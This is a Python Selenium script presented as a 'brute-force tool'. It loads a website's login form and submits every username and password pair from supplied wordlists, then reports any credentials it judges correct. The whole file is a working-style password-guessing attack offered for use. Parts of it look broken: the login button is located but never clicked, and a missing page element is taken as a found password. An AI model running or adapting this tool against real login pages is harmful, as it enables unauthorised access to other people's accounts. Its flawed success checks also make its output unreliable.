
import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import argparse

#Graphics
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   CWHITE  = '\33[37m'

#Config#
parser = argparse.ArgumentParser()
now = datetime.datetime.now()

#Args
parser.add_argument("--username_list", dest="username_list",help="Enter the username list directory")
# parser.add_argument("-u", "--username", dest="username",help="Choose the username")
parser.add_argument("--usernamesel", dest="usernamesel",help="Choose the username selector")
parser.add_argument("--passsel", dest="passsel",help="Choose the password selector")
parser.add_argument("--loginsel", dest="loginsel",help= "Choose the login button selector")
parser.add_argument("--passlist", dest="passlist",help="Enter the password list directory")
parser.add_argument("--website", dest="website",help="choose a website")
options = parser.parse_args()

# Rest of the code remains the same...
def wizard():
    print (banner)
    website = input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Enter a website: ')
    sys.stdout.write(color.GREEN + '[!] '+color.CWHITE + 'Checking if site exists '),
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print (color.GREEN + '[OK]'+color.CWHITE)
            sys.stdout.flush()
    except selenium.common.exceptions.NoSuchElementException:
        pass
    except KeyboardInterrupt:
        print (color.RED + '[!]'+color.CWHITE+ 'User used Ctrl-c to exit')
        exit()
    except:
        t.sleep(1)
        print (color.RED + '[X]'+color.CWHITE)
        t.sleep(1)
        print (color.RED + '[!]'+color.CWHITE+ ' Website could not be located make sure to use http / https')
        exit()

    username_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
    password_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
    login_btn_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
    username_list = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username list to brute-force: ')
    pass_list = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
    brutes(username_list, username_selector ,password_selector,login_btn_selector,pass_list, website)


def brutes(username_list, username_selector, password_selector, login_btn_selector, pass_list, website):
    with open(username_list, 'r') as u, open(pass_list, 'r') as p:
        usernames = u.readlines()
        passwords = p.readlines()

    optionss = webdriver.ChromeOptions()
    optionss.add_argument("--disable-popup-blocking")
    optionss.add_argument("--disable-extensions")
    browser = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=optionss)
    wait = WebDriverWait(browser, 10)

    for username in usernames:
        for password in passwords:
            try:
                browser.get(website)
                wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
                Sel_user = browser.find_element(By.CSS_SELECTOR, username_selector)
                Sel_pas = browser.find_element(By.CSS_SELECTOR, password_selector)
                enter = browser.find_element(By.CSS_SELECTOR, login_btn_selector)

                Sel_user.send_keys(username)
                Sel_pas.send_keys(password)

                

                #the program terminates after the coreect user and password is found
                if "Log In" not in browser.title: #this line should be written according to the website being used
                    print(color.BLUE + '------------------------')
                    print(color.BLUE + 'Password found: ' + color.GREEN + password.strip() + color.BLUE + ' for user: ' + color.GREEN + username.strip())
                      
                    print(color.BLUE + '------------------------')
                    exit()

                print('------------------------')
                print(color.GREEN + 'Tried password: ' + color.RED + password.strip() + color.GREEN +
                      ' for user: ' + color.RED + username.strip())
                print('------------------------')

            except KeyboardInterrupt:
                print('CTRL C')
                break

            except NoSuchElementException:
                print('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE. '
                      'THIS COULD MEAN 2 THINGS: THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS!')
                print('LAST PASS ATTEMPT BELOW')
                print(color.GREEN + 'Password has been found: {0}'.format(password))
                print(color.YELLOW + 'Have fun :)')
                # browser.quit()  
                exit()

success_selector = "#content > nav > form > div > input"

banner = color.BOLD + color.RED +'''
   _____                      
 |__  /  /////    |\\       /||   /////   |\\   ||
   / /  /    \\   | |\\    //||  /    \\  ||\\  ||
 / /_  /  ////\\  | | \\  // || /  ////\\ || \\ ||  
/____|/ _/     \\ | |  \\//  ||/ _/     \\||  \\||
  {0}[{1}-{2}]--> {3}V.2.3
  {4}[{5}-{6}]--> {7}coded by 
  {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)

if options.username_list == None:
    if options.usernamesel == None:
        if options.passsel == None:
            if options.loginsel == None:
                if options.passlist == None:
                    if options.website == None:
                        wizard()


username_list = options.username_list
username_selector = options.usernamesel
password_selector = options.passsel
login_btn_selector = options.loginsel
website = options.website
pass_list = options.passlist
print (banner)
brutes(username_list, username_selector ,password_selector,login_btn_selector,pass_list, website)

